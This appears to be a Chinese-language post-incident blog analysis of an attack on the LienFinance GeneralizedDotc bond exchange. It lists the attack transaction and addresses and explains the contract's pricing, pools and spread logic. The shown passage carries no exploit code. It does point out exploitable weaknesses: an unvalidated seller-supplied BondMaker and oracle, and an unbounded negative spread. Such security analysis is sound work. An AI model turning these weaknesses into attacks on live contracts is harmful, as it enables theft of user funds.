---
title: "LienFinance Attack Analysis"
date: 2026-08-04T10:17:25+08:00
draft: false
author: yinhui
categories: ["security"]
tags: ["attack"]
---

LienFinance Attack Analysis

<!--more-->



## 基本信息

Chain ID: 1

Attack TX: 0xb96d572b557a12f5ef193e88cca86123a6ae1b6e98b0eeee265870c85848e0e7

Attack Block: 25599302

Analysis BLOCK: 25599302-1=25599301

Hacker: 0x0d7d9023531ad1a88414e216ee2715f63561808a

Traget: 0xda6fc5625e617bb92f5359921d43321cebc6bef0



## GeneralizedDotc 分析

0x656e5e976d523a427f05B0c212A22A89ccD9eF18

Is Proxy : No
Contract Name : GeneralizedDotc
Code Size : 23469 bytes
Source Verification : Verified on Etherscan

由于已经verified, 可以下载到本地进行分析

GeneralizedDotc 是一个 OTC (不是AMM,  OTC 撮合模型：卖家挂单创建Pool，买家主动吃单) 债券交易所：任何人都可以挂单买卖 token 化的结构化债券产品，定价由预言机 + BondPricer 实时计算，含 spread 作为卖家收益

合约由三个 abstract 交易模块拼装而成：

```solidity
contract GeneralizedDotc is BondVsBondExchange, BondVsErc20Exchange, BondVsEthExchange { ... }
```

三者共同继承 `BondExchange`（持有全局 immutable：`_bondMakerContract` / `_priceOracleContract` / `_volatilityOracleContract` / `_volumeCalculator` / `_bondShapeDetector`）。`BondVsEthExchange` 额外继承 `TransferETH`，`receive()` 由它提供。

**除了 `receive()` 之外，合约本身不持有任何资金**：三种交易全部是 `transferFrom` 在买卖双方之间直转；唯一的例外是 ETH 池——ETH 必须先 `depositEth()` 存进合约，由 `_depositedEth` 逐地址记账。



### 基本概念

#### Bond(债卷)

**Bond** 并非传统意义上的固定收益债券，而是一种**Token 化的结构化衍生品**，更准确地说，它像一张**期权凭证**。

> **一句话理解**：Bond 是一张“条件兑奖券”。例如：“如果 ETH 价格在 7 月 31 日前超过 $3,000，这张券可按（ETH价格 - $3,000）兑换现金。”  
> 这张券本身是 **ERC20 Token**，可在二级市场自由买卖——看涨就买入，看跌就卖出。到期日系统自动结算。

##### Bond 的核心属性

每个 Bond 在 `BondMaker` 合约中存储以下 4 个关键字段：

| 字段               | 含义                              | 示例说明                                                     |
| ------------------ | --------------------------------- | ------------------------------------------------------------ |
| `bondTokenAddress` | 代表该债券的 ERC20 代币合约地址   | 持有此代币即持有该债券                                       |
| `maturity`         | 到期日（Unix 时间戳，秒）         | 到期后债券失效，自动结算                                     |
| `solidStrikePrice` | **纯 SBT 标记位**，不是通用行权价 | 由 `_getSbtStrikePrice(polyline)` 计算：**只有当折线恰好是 2 段、且每段 `right.y` 都等于 `polyline[0].right.x` 时**才返回该值，否则一律返回 `0`。即：只有 PURE_SBT 形状的债券此字段非 0，其余三种形状全部为 0 |
| `fnMapID`          | 指向收益函数（payoff function）   | 哈希值，决定“到期时值多少钱”                                 |

> ⚠️ `solidStrikePrice` 容易被误读成"所有债券的行权价"。它实际上是一个**形状判别的副产品**：非 0 ⟺ 这只债券是纯 SBT。`registerNewBondGroup` 正是用这个字段来限制"一个 BondGroup 里最多只能有一只 PURE_SBT，且必须排在第 0 位"。



##### 最关键的机制：fnMap（收益函数）

**fnMap** 是一段编码的**折线（polyline）**，定义了“**标的资产价格 → 债券 payoff**”的映射关系。  
折线由多个 `LineSegment` 组成，每个线段有起点和终点坐标（x = 标的价，y = payoff）。

> **通俗理解**：fnMap 就是“兑奖规则表”。比如：
> ```
> 如果 ETH 价格 < 100  → payoff = 0
> 如果 100 ≤ ETH 价格 ≤ 200 → payoff = ETH价格 - 100
> 如果 ETH 价格 > 200 → payoff = 100
> ```
> 上述规则在合约中被编码为 3 段折线坐标，由 `BondPricer` 读取并计算实时价值。

**看涨期权示例**：
- 标的价 < 行权价 → payoff = 0
- 标的价 ≥ 行权价 → payoff = 标的价 − 行权价

#####  Bond 的四种形状分类（由 `DetectBondShape` 识别）

识别逻辑在 `DetectBondShape._getBondType`，**按 PURE_SBT → SBT_SHAPE → LBT_SHAPE → TRIANGLE 的顺序依次尝试**，命中即返回；四种都不匹配则 `success = false`。每种形状对**线段数量**有硬性要求：

| BondType    | 线段数 | 形状示意图 | 判别条件（`zippedLines[i]` 记作第 i 段，从 0 计）            | 业务含义                                                     |
| ----------- | ------ | ---------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| `PURE_SBT`  | 2      | `/‾‾‾‾‾`   | 第 1 段：`left.x != 0`、`left.y == left.x`、`right.x > left.x`、`right.y == left.y` | **优先级债券**：payoff = `min(标的价, K)`。低于 K 时全额吃价格，高于 K 后封顶不再增长 |
| `SBT_SHAPE` | 3      | `___/‾‾‾`  | 第 1 段：`left.x != 0`、`left.y == 0`、`right.y != 0`；第 2 段：`right.x > 第1段right.x`、`right.y == 第1段right.y` | K₁ 之前为 0，K₁→K₂ 线性上升，K₂ 之后封顶                     |
| `LBT_SHAPE` | 2      | `___/`     | 第 1 段：`left.x != 0`、`left.y == 0`、`right.x > left.x`、`right.y != 0` | **劣后债券**：K 之前 payoff = 0，K 之后线性上升且不封顶      |
| `TRIANGLE`  | 4      | `___/\___` | 第 1 段升至非 0 峰；第 2 段：`right.y == 0`；第 3 段：`right.x >` 第 2 段、`right.y == 0` | 三角 payoff：价格在区间内才有收益，区间外归零                |

> ⚠️ 注意：`PURE_SBT` 是**先线性上升后封顶**（`/‾‾‾`），不是"低于行权价 payoff = 0"。"低于某价 payoff = 0"的是 `LBT_SHAPE`。
> 最典型的一级市场组合就是 `PURE_SBT + LBT_SHAPE`：前者 `min(P, K)`，后者 `max(P - K, 0)`，两者相加恰好等于 `P`，即 1 ETH 抵押品的全部价值。

另有两条来自 `Polyline.assertPolyline` 的全局约束（`registerNewBond` 首次注册某个 fnMap 时强制执行），它们限定了折线的合法输入空间：

- 第 0 段必须从 `(0, 0)` 起始；
- 相邻线段首尾坐标必须重合（连续函数），且**相邻两段斜率不得相同**；
- **最后一段的斜率必须满足 `0 ≤ 斜率 ≤ 1`**；
- 折线不能处处为 0（`_isBondWorthless`）。

#####  Bond Token 的精度与交易

Bond 代币遵循 **ERC20** 标准，可以像普通代币一样转账、授权。  
精度为 **8 位小数**，因此钱包中显示 `100` 枚债券，实际最小单位为 `100 × 10⁸`。

##### 关键价格概念

| 概念       | 定义                                                   | 示例              |
| ---------- | ------------------------------------------------------ | ----------------- |
| **标的价** | 债券挂钩资产当前的市场价格，由预言机实时提供           | 当前 ETH = $2,900 |
| **行权价** | fnMap 折线上的拐点 x 坐标，payoff 斜率发生变化的临界点 | 行权价 = $3,000   |

**比较逻辑**（以 `LBT_SHAPE` 为例）：

- 标的价（$2,900）< 行权价（$3,000）→ 未触发，payoff = 0
- 标的价（$3,100）> 行权价（$3,000）→ 触发，payoff = $3,100 − $3,000 = $100

> 四种 BondType 图形上的“拐点”x 坐标，即对应行权价的位置。
> 但**不同形状的"触发"含义不同**：`LBT_SHAPE` 是低于行权价归零，`PURE_SBT` 恰恰相反——低于行权价时 payoff = 标的价本身，高于行权价后才封顶。上面这组"< 行权价 → payoff = 0"的例子只适用于 `LBT_SHAPE` / `SBT_SHAPE` / `TRIANGLE`。

##### 总结

| 维度     | 说明                                                      |
| -------- | --------------------------------------------------------- |
| 本质     | Token 化的期权凭证，非固定收益产品                        |
| 核心机制 | fnMap 折线定义 payoff 规则，BondPricer 按坐标计算价值     |
| 交易方式 | ERC20 标准，可转账、授权，二级市场自由买卖                |
| 到期结算 | 自动执行，按 fnMap 规则兑付                               |
| 形状分类 | 4 种（PURE_SBT / LBT_SHAPE / SBT_SHAPE / TRIANGLE）       |
| 关键价格 | 标的价（市场实时） vs 行权价（合约固定），比较决定 payoff |



#### BondMaker（债券工厂）

`BondMaker` 是一个**独立部署的外部合约**。`GeneralizedDotc` 通过 `BondMakerInterface` 与其交互，**只管交易，不管铸造**——债券的发行、清算、抵押品管理全部在 BondMaker 侧完成。

> **一句话理解**：BondMaker = 债券的"印钞厂 + 银行"。它负责印债券（铸造）、保管抵押品（防止卖家跑路）、到期清算（该兑多少钱兑多少钱）。GeneralizedDotc 只管柜台交易，不管后台。

##### BondMaker 的核心职责

| 职责       | 函数                                                         | 说明                                                      |
| ---------- | ------------------------------------------------------------ | --------------------------------------------------------- |
| 发行债券   | `registerNewBond(maturity, fnMap) → bondID`                  | 输入到期日和 payoff 折线编码，返回债券 ID 和 ERC20 Token  |
| 创建债券组 | `registerNewBondGroup(bondIDs[], maturity) → bondGroupID`    | 将多个债券打包为一组，共享到期日                          |
| 发行给用户 | `issueNewBonds(bondGroupID)`（payable）                      | 附带抵押品，向 `msg.sender` 铸造组内每只债券的等量 Token  |
| 到期清算   | `liquidateBond(bondGroupID, oracleHintID)`                   | 到期后按预言机价格结算，抵押品从池中付给各债券 Token 合约 |
| 赎回抵押品 | `reverseBondGroupToCollateral(bondGroupID, amount)`          | 将债券反向兑换回抵押品                                    |
| 等价互换   | `exchangeEquivalentBonds(inputGroupID, outputGroupID, amount, exceptionBonds)` | 在同一 BondMaker 内，将一组债券换成另一组                 |

##### BondMaker 的关键状态

以下四项通过 `BondMakerInterface` 暴露为 view 函数。注意 `collateralAddress` / `decimalsOfBond` / `decimalsOfOraclePrice` 在 `BondMakerCollateralizedEth` 里并非存储变量，而是 immutable 或常量返回值：

| 字段                    | 含义           | 大白话                                                       |
| ----------------------- | -------------- | ------------------------------------------------------------ |
| `collateralAddress`     | 抵押品代币地址 | 本例固定返回 `address(0)`（原生 ETH）。**所有 BondGroup 共享同一个抵押品池，合约不做分组记账** |
| `oracleAddress`         | 价格预言机地址 | 链上的"市场报价员"，告诉合约标的资产现价多少                 |
| `decimalsOfBond`        | 债券精度       | 合约强制 = 8                                                 |
| `decimalsOfOraclePrice` | 预言机价格精度 | 合约强制 = 8                                                 |

> **为什么需要抵押品**：Bond 是发行人的承诺——"如果条件满足，到期我付钱"。为防止发行人赖账，他必须事先将抵押品锁定在 BondMaker 中。到期结算时，合约直接从抵押品池中付钱，发行人无法反悔。
>
> **为什么需要预言机**：区块链无法感知链下世界。预言机（Oracle）充当"数据搬运工"，将真实世界的价格（如 Coinbase 上的 ETH/USD 报价）搬运到链上，供合约计算使用。

##### 跨 BondMaker 交易

不同 BondMaker 可配置不同的抵押品和预言机，对应不同的底层资产。BondVsBond 的买家端允许指定另一个 BondMaker（`bondMakerForUser`），实现**跨资产类别的债券互换**——例如用 WBTC 抵押品发行的债券，去换 ETH 抵押品发行的债券。

> **代码事实**：`bondMakerForUser` 是**卖家在创建 Pool 时任意传入的地址**。`GeneralizedDotc` 对它唯一的校验是 `_assertBondMakerDecimals`——只检查 `decimalsOfBond() == 8` 且 `decimalsOfOraclePrice() == 8`。它**不校验**这个地址是否真的是一个 BondMaker、抵押品是什么、预言机是否可信。后续 `_batchTransferBondFrom` 会调用 `bondMakerForUser.oracleAddress()` 取价，也就是说买方债券篮子的估价链条完全由**卖家指定的合约**决定。

##### 总结

| 维度                      | 说明                                       |
| ------------------------- | ------------------------------------------ |
| 角色                      | 债券的生命周期管理者（发行→清算）          |
| 与 GeneralizedDotc 的关系 | 后端工厂，交易合约只读不写                 |
| 抵押品机制                | 卖家事先锁定抵押品，到期自动结算，防止违约 |
| 预言机角色                | 提供标的资产的链上实时价格                 |
| 精度约束                  | Bond + Oracle 精度均强制 = 8               |


#### Pool（OTC 挂单）

Pool 是**卖家发布的交易挂牌**。这是一个纯粹的 **OTC 模型**——没有流动性池、没有定价曲线、没有 AMM，只有买卖双方一对一的原子交换。

> **一句话理解**：Pool = 卖家的"地摊"。卖家摆出牌子："我卖 X，收 Y，定价规则用 Z，手续费收 W"。买家看中了就来成交，一手交钱一手交货，不存在中间池子。

##### 三种 Pool 类型的字段对比

| 字段             | VsErc20Pool                   | VsEthPool         | VsBondPool                                             |
| ---------------- | ----------------------------- | ----------------- | ------------------------------------------------------ |
| seller           | ✓                             | ✓                 | ✓                                                      |
| 交易对           | `swapPairToken`（任意 ERC20） | ETH（固定）       | 另一 BondMaker 下的债券                                |
| 交易对价格预言机 | `swapPairOracle`              | `ethOracle`       | 不需要（债券以 USD 计价）                              |
| 卖方债券定价器   | `bondPricer`                  | `bondPricer`      | `bondPricer`                                           |
| 买方债券定价器   | 不需要                        | 不需要            | `bondPricerForUser`                                    |
| 波动率预言机     | Pool 里没有此字段             | Pool 里没有此字段 | `volatilityOracle`（**只用于给买方债券篮子估价**）     |
| 费率             | `feeBaseE4`                   | `feeBaseE4`       | `feeBaseE4`                                            |
| 方向             | `isBondSale`                  | `isBondSale`      | 结构体中无此字段，`_getVsBondPool` **硬编码返回 true** |

> **波动率预言机的来源**：给**卖方债券**估价时用的波动率，三种 Pool 一律取自构造函数锁死的全局 `_volatilityOracleContract`（见 `_calcBondPriceAndSpread`），Pool 无法覆盖它。VsBondPool 里那个 `volatilityOracle` 字段是**另一个**预言机，仅在 `_batchTransferBondFrom` / `_totalBondAllowance` 中给**买方的债券篮子**估价时使用。同理，卖方债券的标的价用的是全局 `_priceOracleContract`（= 构造时 `bondMakerAddress.oracleAddress()`），而买方篮子的标的价用的是 `bondMakerForUser.oracleAddress()`。

> **BondVsBond 的方向限制**：`VsBondPool` 结构体里根本没有 `isBondSale` 字段，`_getVsBondPool` 直接返回 `true`。卖家只能卖自己的债券，买家必须用另一 BondMaker 下的债券篮子来支付。不存在"卖家买债券、买家付债券篮子"的 Pool。

##### Pool 的生命周期

```
create（创建） → update（更新可变参数） → delete（删除）
```

- 创建：调用 `createVs*Pool`，即时验证预言机可用性
- 更新：只能改定价器、预言机、费率，**不能改方向**
- 删除：清空 Pool 数据
- 权限：更新和删除均要求 `msg.sender == pool.seller`

##### 创建时的即时验证

| Pool 类型   | 验证内容                                                     |
| ----------- | ------------------------------------------------------------ |
| ERC20 / ETH | 立即调用交易对预言机，验证 `latestPrice() != 0`；并要求 `swapPairToken` / `oracle` / `bondPricer` 均非零地址 |
| BondVsBond  | 调用 `_assertBondMakerDecimals` 验证买方 BondMaker 精度为 8+8；并要求 `bondMakerForUser` / `bondPricerForUser` / `bondPricer` 均非零地址 |

> **注意**：`bondPricer` 只做非零地址检查，**创建时不会试调用它**。`volatilityOracle`（VsBondPool）连非零检查都没有——它可以被设为 `address(0)`，只有在真正交易时调用 `getVolatility()` 才会失败。

##### 总结

| 维度      | 说明                                   |
| --------- | -------------------------------------- |
| 交易模式  | 纯 OTC，买卖双方一对一原子交换         |
| Pool 类型 | 3 种（ERC20 / ETH / Bond）             |
| 生命周期  | create → update → delete，仅卖家可管理 |
| 方向      | ERC20/ETH 可选，BondVsBond 固定卖债券  |
| 关键参数  | 定价器 + 预言机 + 费率，均在创建时设定 |


#### Pool ID

Pool ID 是每个 Pool 的**唯一标识符**，由 `keccak256` 确定性生成。不需要上链即可算出。

##### 生成规则

三者均使用 `abi.encode`（**非** `abi.encodePacked`），因此不存在拼接歧义导致的碰撞：

| Pool 类型 | 哈希输入                                                     |
| --------- | ------------------------------------------------------------ |
| VsErc20   | `keccak256(abi.encode("Bond vs ERC20 exchange", address(this), seller, swapPairAddress, isBondSale))` |
| VsEth     | `keccak256(abi.encode("Bond vs ETH exchange", address(this), seller, isBondSale))` |
| VsBond    | `keccak256(abi.encode("Bond vs SBT exchange", address(this), seller, bondMakerForUser))` |

> 对比：BondMaker 的 `generateBondID` 用的是 `abi.encodePacked(address(this), maturity, fnMap)`。

##### 含义

- 同一 seller、同一代币对、同一方向 → 只能有一个 Pool
- Pool ID 是后续所有操作（update / delete / exchange）的"钥匙"
- 可在链下预先计算，无需链上查询
- Pool 的"存在性"判据是 `pool.seller != address(0)`；`delete` 后 seller 归零，**同一 Pool ID 可以被原 seller 重新创建**

##### 总结

| 维度       | 说明                       |
| ---------- | -------------------------- |
| 生成方式   | `keccak256` 确定性哈希     |
| 唯一性保证 | 每人、每交易对、每方向唯一 |
| 用途       | 所有 Pool 操作的标识符     |


#### `isBondSale`（交易方向）

决定**谁来付钱、谁来交货**。在创建 Pool 时设定，**不可修改**。就像闲鱼上的卖家,他可以卖,也可以收

##### 两种方向

|          | `isBondSale = true`（卖家卖债券） | `isBondSale = false`（卖家买债券） |
| -------- | --------------------------------- | ---------------------------------- |
| 卖家提供 | Bond Token                        | 钱（ERC20 / ETH）                  |
| 买家提供 | 钱（ERC20 / ETH / 债券篮子）      | Bond Token                         |
| 卖家角色 | 债券出让方                        | 资金出让方                         |
| 资金流向 | 买家 → 卖家                       | 卖家 → 买家                        |
| 债券流向 | 卖家 → 买家                       | 买家 → 卖家                        |

##### 重要细节

- 设定后**不可更改**，想换方向只能删除重建
- BondVsBond Pool **没有此选项**——硬编码为 `true`（只能卖债券）

##### 总结

| 维度   | 说明                              |
| ------ | --------------------------------- |
| 含义   | `true` = 卖债券，`false` = 买债券 |
| 可变性 | 创建时设定，不可修改              |
| 例外   | BondVsBond 固定为 `true`          |


#### `rateE8`（汇率）

**每个 Bond Token 值多少交易对代币**。精度为 8 位小数。

> **一句话理解**：`rateE8` = 这张债券的"标价"。比如 rateE8 = 500000000（即 5.0），意味着 1 个债券换 5 个 ERC20 代币。

##### 计算过程

汇率计算分两步：

**第一步 — 基础汇率**（债券与交易对在 USD 尺度上对齐）：

```
bondPriceE8 = _calcUsdPrice( bondPricer 返回的 bondPriceE8 )
            = bondPriceE8 × _volumeCalculator.latestPrice() / 10⁸
rateE8      = bondPriceE8 × 10⁸ / swapPairPriceE8
```

即：1 个债券值多少 USD ÷ 1 个交易对代币值多少 USD。

> BondVsBond 池不做这一步除法：`_calcRateBondToUsd` 里 `swapPairPriceE8` 被赋值为常量 `10**8`（作为返回值），但**并未参与 rate 的计算**，rate 直接 = `bondPriceE8 × (10⁸ + spread) / 10⁸`。

**第二步 — 叠加价差**（按交易方向调整）：

| 方向               | ERC20 池                      | ETH 池                        | BondVsBond 池                 |
| ------------------ | ----------------------------- | ----------------------------- | ----------------------------- |
| `isBondSale=true`  | `rate × (10⁸ + spread) / 10⁸` | `rate × (10⁸ + spread) / 10⁸` | `rate × (10⁸ + spread) / 10⁸` |
| `isBondSale=false` | `rate × 10⁸ / (10⁸ + spread)` | `rate × (10⁸ − spread) / 10⁸` | 不存在                        |

> 上表中 `10⁸ + spread` 与 `10⁸ − spread` 在代码里都被 `uint256(...)` 强制转换。由于 `spreadE8` 是 `int256` 且**可以为负**（见下节），这些转换在极端参数下的行为需要单独讨论。

> ⚠️ **ETH 池不对称**：Bond→ETH 方向使用 `rate × (1 − spread)`，而非 `rate / (1 + spread)`。spread=10% 时，ERC20 买家用 `rate/1.1 ≈ 0.909×rate` 获得债券，ETH 买家用 `rate×0.9 = 0.900×rate` 获得债券——ETH 方向对买家略不利。

##### 总结

| 维度     | 说明                                                    |
| -------- | ------------------------------------------------------- |
| 含义     | 1 bond = ? 交易对代币                                   |
| 精度     | 8 位小数                                                |
| 计算方式 | 债券 USD 价格 ÷ 交易对 USD 价格，再叠 spread            |
| 特殊点   | ETH 池 Bond→ETH 方向使用 `1−spread` 而非 `1/(1+spread)` |


#### `spreadE8`（价差 / 手续费）

卖方收取的**手续费**，由费率、市场波动率和杠杆率共同决定。精度为 8 位小数。

> **一句话理解**：spread = 卖家的"辛苦费"。波动越剧烈，卖家在报价到成交之间的风险越大 → 多收点钱覆盖风险。

##### 计算公式

`_calcSpread` 的完整逻辑（注意它返回 `int256`）：

```solidity
volE8 = clamp(oracleVolatilityE8, 10**8, 2 * 10**8);   // 钳位到 [100%, 200%]
volTimesLevE16 = volE8 * leverageE8;

spreadE8 = feeBaseE4 * ( (feeBaseE4 < 0 || volTimesLevE16 < 10**16)
                          ? 10**16
                          : volTimesLevE16 ) / 10**12;

spreadE8 = spreadE8 > MAX_SPREAD_E8 ? MAX_SPREAD_E8 : spreadE8;   // 只钳上限
```

两个容易被略过的分支：

1. **`feeBaseE4 < 0` 时，乘数被强制固定为 `10¹⁶`**，波动率和杠杆率完全不参与计算，此时 `spreadE8 = feeBaseE4 × 10⁴`，是一个**负数**。
2. **钳位是单边的**：只有 `> MAX_SPREAD_E8` 才被压回 `10⁸`，**没有下限钳位**。

##### 参数说明

| 参数         | 含义                                                       | 取值                                    | 谁设定                                          |
| ------------ | ---------------------------------------------------------- | --------------------------------------- | ----------------------------------------------- |
| `feeBaseE4`  | 基础费率（基点），类型 **`int16`，可正可负**               | `50` = 0.5%；取值范围 `[-32768, 32767]` | 卖家创建 / 更新 Pool 时任意指定，无任何范围校验 |
| `volE8`      | 波动率                                                     | 预言机提供，钳位在 [100%, 200%]         | 全局 `_volatilityOracleContract`（卖方债券侧）  |
| `leverageE8` | 杠杆率（债券价格对标的价格的敏感度）                       | BondPricer 计算                         | 卖家指定的 BondPricer                           |
| 底线 `10¹⁶`  | 当 `volE8 × leverageE8 < 10¹⁶` 或 `feeBaseE4 < 0` 时取代之 | 使 `spread = feeBaseE4 × 10⁴`           | 代码固定                                        |
| 上限         | `MAX_SPREAD_E8`                                            | `10⁸`（100%）                           | 代码固定                                        |

> ⚠️ 源码在 `_calcRateBondToErc20` / `_calcRateBondToEth` 里都有一句注释 `// 'spreadE8' is less than 0.15 * 10**8`。**这句注释与代码不符**：`feeBaseE4 = 32767` 时 `spread` 会被钳到 `10⁸`（100%），`feeBaseE4` 为负时 `spread` 为负。注释描述的 0.15×10⁸ 上界在代码里没有任何强制手段。

##### 总结

| 维度     | 说明                                                         |
| -------- | ------------------------------------------------------------ |
| 本质     | 卖方手续费，覆盖报价到成交之间的市场风险                     |
| 类型     | `int256`，**可以为负**                                       |
| 决定因素 | 卖家设定的费率 + 预言机波动率 + 债券杠杆率                   |
| 实际范围 | `[-32768 × 10⁴, 10⁸]`，即 `[-3.2768 × 10⁸, 10⁸]`；只有上限被钳 |
| 风险逻辑 | `feeBaseE4 > 0` 时：波动越大、杠杆越高 → spread 越大         |


#### 精度体系

合约中不同资产使用不同的小数位数，计算时必须**先对齐再运算**。

> **一句话理解**：精度 = "小数点后几位"。ETH 是 18 位，债券是 8 位——直接做除法会差 100 倍，所以每次跨精度运算都要先"对齐小数点"。

##### 各资产精度

| 资产              | 精度 | 符号                       | 说明                              |
| ----------------- | ---- | -------------------------- | --------------------------------- |
| Bond Token        | 8    | `DECIMALS_OF_BOND`         | 1 bond = 10⁸ 最小单位             |
| 预言机价格（USD） | 8    | `DECIMALS_OF_ORACLE_PRICE` | 1 USD = 10⁸ 最小单位              |
| 债券的 USD 价值   | 16   | `DECIMALS_OF_BOND_VALUE`   | 债券精度 **+** 预言机精度 = 8 + 8 |
| ETH               | 18   | `DECIMALS_OF_ETH`          | 1 ETH = 10¹⁸ wei                  |
| 任意 ERC20        | 可变 | `token.decimals()`         | 取决于具体代币                    |

> `DECIMALS_OF_BOND_VALUE` 常量只定义在 `BondVsBondExchange` 里；ERC20 / ETH 两条路径中同一个 16 是以字面量 `DECIMALS_OF_BOND + 8` 出现的。
>
> 另有一处不用常量的地方：`_exchangeBondToBond` 计算 `bondAmount` 时用的是 `bondToken.decimals() + 8`，**读的是债券 token 自己报的精度**，而不是 `DECIMALS_OF_BOND`。对本例的 BondMaker 二者都等于 8。

##### Decimal Gap 换算（`_applyDecimalGap`）

当两种精度不同的代币参与乘除运算时，必须先将两边拉到同一精度：

```
// 用 ETH 买债券：ethAmount（精度 18）→ bondAmount（精度 8+8=16）
bondAmount = _applyDecimalGap(ethAmount, 18, 16) / rateE8;
//            = ethAmount × 10^(16−18) / rateE8
//            = ethAmount / 10² / rateE8
```

`_applyDecimalGap` 的实现要点：

```solidity
if (decimalsOfBase > decimalsOfQuote) d = decimalsOfBase - decimalsOfQuote;
else if (decimalsOfBase < decimalsOfQuote) n = decimalsOfQuote - decimalsOfBase;
require(n < 19 && d < 19, "decimal gap needs to be lower than 19");
return baseAmount.mul(10**n).div(10**d);
```

> 精度差硬上限为 **18**（`require(n < 19 && d < 19)`），超过直接 revert。注意先乘后除，缩小精度时是**向下取整**（`_batchTransferBondFrom` 里另有一处 `divRoundUp` 是向上取整）。

##### 总结

| 维度       | 说明                                |
| ---------- | ----------------------------------- |
| 基础精度   | 8（Bond + Oracle）                  |
| 跨精度运算 | `_applyDecimalGap` 对齐小数点后计算 |
| 精度差上限 | ≤ 18，否则 revert                   |
| 取整方向   | 默认向下取整（`div`）               |


#### BondPricer（债券定价器）

BondPricer 是一个**外部合约**，由卖家在创建 Pool 时指定，负责按 Black-Scholes 公式计算债券的实时价格和杠杆率。

> **一句话理解**：BondPricer = 债券的"估价师"。它根据"标的价格""还剩多少时间""价格波动多剧烈"三个因素，给出这张债券现在值多少钱。

##### 输入参数

| 参数            | 含义                                                        | 来源                                                         |
| --------------- | ----------------------------------------------------------- | ------------------------------------------------------------ |
| `bondType`      | 债券形状类型（PURE_SBT / SBT_SHAPE / LBT_SHAPE / TRIANGLE） | `DetectBondShape.getBondTypeByID`，识别失败则整笔 revert `"cannot calculate the price of this bond"` |
| `points`        | payoff 折线的关键坐标点（1~4 个，随形状而变）               | 同上，由 `DetectBondShape` 从 fnMap 中提取                   |
| `spotPrice`     | 标的资产当前价格                                            | 全局 `_priceOracleContract.latestPrice()`                    |
| `volatilityE8`  | 波动率                                                      | 全局 `_volatilityOracleContract.getVolatility(untilMaturity)` |
| `untilMaturity` | 距到期剩余秒数                                              | `maturity - block.timestamp`，已到期则 revert `"the bond should not have expired"` |

> 上表是**卖方债券**的定价路径（`_calcBondPriceAndSpread`）。给**买方债券篮子**估价的 `_calcBondPrice` 走的是另一套输入：`bondMakerForUser` + Pool 里的 `volatilityOracle` + `bondPricerForUser`，且用 `try/catch` 包住 `calcPriceAndLeverage`——**pricer revert 时不抛错，而是把该债券价格视为 0 并跳过**。

##### 输出

| 输出          | 含义                                |
| ------------- | ----------------------------------- |
| `bondPriceE8` | 该债券当前的理论价格                |
| `leverageE8`  | 杠杆率——标的涨 1%，债券价格约涨多少 |

> `leverageE8` 只用于 `_calcSpread`，不参与 `bondPriceE8` 本身。

##### Black-Scholes 的三个核心因素

| 因素                 | 逻辑                                 | 例子                                                         |
| -------------------- | ------------------------------------ | ------------------------------------------------------------ |
| 标的价格离行权价多远 | 越近 → 越容易触发 → 越值钱           | ETH $3100 vs 行权价 $3000 → 很近，值钱；ETH $2000 → 很远，不值钱 |
| 还剩多少时间         | 时间越多 → 机会越多 → 越值钱         | 剩 30 天 → 值钱；剩 1 小时 → 基本不值钱                      |
| 波动有多大           | 波动越大 → 越可能跳到触发价 → 越值钱 | ETH 每天 ±10% → 值钱；稳定币每天 ±0.01% → 不值钱             |

> 输出价格后还需经 `_calcUsdPrice` 转为 USD 计价（乘以 volume calculator 的汇率），再参与汇率计算。

##### 总结

| 维度     | 说明                       |
| -------- | -------------------------- |
| 角色     | 债券定价引擎               |
| 定价模型 | Black-Scholes              |
| 关键输入 | 标的价格、波动率、剩余时间 |
| 关键输出 | 债券理论价格 + 杠杆率      |
| 可替换性 | 卖家可自定义 BondPricer    |

### 对外接口

#### 状态改变函数

##### calcRateBondToErc20 —— 查询 Bond/ERC20 汇率

```
function calcRateBondToErc20(bytes32 bondID, bytes32 poolID)
    external
    returns (uint256 rateE8);
```

函数作用：实时查询指定 Bond vs ERC20 池的当前汇率（含 spread）。它**不修改本合约的状态**，但因为要以非 `view` 方式调用外部预言机的 `latestPrice()`（该接口本身是 `nonpayable`，允许预言机内部写状态），所以整个函数也只能是 `nonpayable`。**调用此函数需要消耗 gas**。

参数含义：
- `bondID`：目标债券 ID。
- `poolID`：目标 VsErc20 池的 ID。

返回值：
- `rateE8`：1 个 Bond Token 值多少 ERC20 代币（精度 8 位小数）。

条件限制：
- Pool 必须存在（`seller != address(0)`），否则 revert `"the exchange pair does not exist"`。
- Pool 中指定的 ERC20 预言机 `latestPrice()` 不能 revert，且返回值不能为 0（`div` 时报 `"ERC20 oracle price must be non-zero"`）。
- 债券类型必须能被 `DetectBondShape` 识别为已知 4 种之一，否则 revert `"cannot calculate the price of this bond"`。
- 债券不能已到期，否则 `maturity - block.timestamp` 下溢 revert `"the bond should not have expired"`。
- BondMaker 的预言机 `latestPrice()` 不能 revert。
- 全局波动率预言机 `getVolatility()` 不能 revert。
- Pool 中指定的 BondPricer 的 `calcPriceAndLeverage()` 不能 revert。

> **注意**：这条路径上**没有** `require(bondTokenAddress != address(0))`。`_getBond` 里那句 `// Revert if bondTokenAddress is zero.` 是错误注释——`ERC20(bondTokenAddress)` 只是类型转换，不会 revert。未注册的 bondID 在这里最终由 `getBondTypeByID` 识别失败挡住。真正的显式零地址检查只存在于 5 个 `exchange*` 内部函数里。



##### calcRateBondToEth —— 查询 Bond/ETH 汇率

```
function calcRateBondToEth(bytes32 bondID, bytes32 poolID)
    external
    returns (uint256 rateE8);
```

函数作用：实时查询指定 Bond vs ETH 池的当前汇率（含 spread）。同样是 `nonpayable`，原因同 `calcRateBondToErc20`。

参数含义：
- `bondID`：目标债券 ID。
- `poolID`：目标 VsEth 池的 ID。

返回值：
- `rateE8`：1 个 Bond Token 值多少 ETH（精度 8 位小数）。

条件限制：
- Pool 必须存在。
- 债券必须未到期、类型可识别（与 `calcRateBondToErc20` 同，此处同样没有零地址检查）。
- BondMaker 预言机、全局波动率预言机、Pool 指定的 ETH 预言机均不能 revert，且 ETH 预言机价格不能为 0。
- BondPricer 的 `calcPriceAndLeverage()` 不能 revert。



##### calcRateBondToUsd —— 查询 Bond/USD 汇率

```
function calcRateBondToUsd(bytes32 bondID, bytes32 poolID)
    external
    returns (uint256 rateE8);
```

函数作用：实时查询指定 Bond vs USD 的汇率（仅 BondVsBond 池使用）。同样 `nonpayable`。

参数含义：
- `bondID`：目标债券 ID。
- `poolID`：目标 VsBond 池的 ID。

返回值：
- `rateE8`：1 个 Bond Token 值多少 USD（精度 8 位小数）。

条件限制：
- Pool 必须存在。
- 债券必须未到期、类型可识别（同样没有零地址检查）。
